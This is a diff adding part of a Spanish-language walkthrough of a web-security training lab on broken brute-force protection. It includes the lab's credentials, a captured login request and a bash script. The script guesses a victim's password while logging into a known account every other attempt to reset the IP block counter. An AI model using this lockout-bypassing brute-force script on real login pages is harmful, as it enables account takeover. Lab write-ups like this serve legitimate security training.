@@ -257,3 +257,62 @@ Validamos que las credenciales son correctas:
 ![creds](img12.png)
 
 ## 4. Lab: Broken brute-force protection, IP block
+
+```
+Your credentials: wiener:peter
+Victim's username: carlos
+```
+
+```
+https://acdc1fe11eb6d006807363a8001d00fb.web-security-academy.net/login
+csrf=zus2HXTmtFPFdOSnT7JHTTuVSFIY5KAQ&username=sd&password=sd
+```
+
+Escribiremos un script para desarrollar este ejercicio el cual será el siguiente:
+
+```bash
+#!/bin/bash
+
+URL='https://acdc1fe11eb6d006807363a8001d00fb.web-security-academy.net/login'
+NULL='/dev/null'
+
+REQUEST1=`curl $URL -D- -s`
+CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+USER="carlos"
+USER0="wiener"
+PASS0="peter"
+N=1
+for PASS in `cat password.txt`;do
+
+    if [ $[ $N % 2 ] == 0 ]
+    then
+        #Nos logeamos con la cuenta existente
+        #Para reiniciar el contador. :D
+        DATA2='csrf='$CSRF'&username='$USER0'&password='$PASS0
+        curl $URL -d $DATA2 -b $COOKIE -s > $NULL
+    fi
+    DATA='csrf='$CSRF'&username='$USER'&password='$PASS
+    RESULT=`curl $URL -d $DATA -b $COOKIE -s`
+
+    if echo $RESULT | grep -o "Incorrect password" > $NULL
+    then
+        echo "Incorrect creds: $USER:$PASS"
+    else
+        echo "Valid creds: $USER:$PASS"
+        break
+    fi
+    N="$[ $N + 1 ]"
+done
+```
+
+Obtenemos el resultado del script.
+
+![output](img13.png)
+
+Al probarlo en el sitio web verificamos que completamos el nivel.
+
+![fin](img14.png)
+
+## 5. Lab: Username enumeration via account lock
+
